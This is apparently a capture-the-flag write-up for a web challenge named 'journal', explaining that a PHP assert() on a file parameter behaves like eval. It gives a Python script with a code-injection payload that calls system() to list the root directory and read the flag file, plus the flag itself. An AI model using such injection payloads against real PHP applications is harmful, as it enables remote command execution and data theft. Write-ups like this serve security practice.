---
created: 2024-07-19T15:44
updated: 2024-07-21T16:11
points: 100
solves: 518
---

```php
assert("strpos('$file', '..') === false") or die("Invalid file!");
```

This line is dangerous as the assert statement is acting as `eval`.

Our payload is hence simple.

```python
import requests
import urllib.parse
payload = urllib.parse.quote_plus("'.die(system('ls /')).'")
print(requests.get("http://journal.chal.imaginaryctf.org/?file="+payload).text)

payload = urllib.parse.quote_plus("'.die(system('cat /flag-cARdaInFg6dD10uWQQgm.txt')).'")
print(requests.get("http://journal.chal.imaginaryctf.org/?file="+payload).text)
# ictf{assertion_failed_e3106922feb13b10}
```
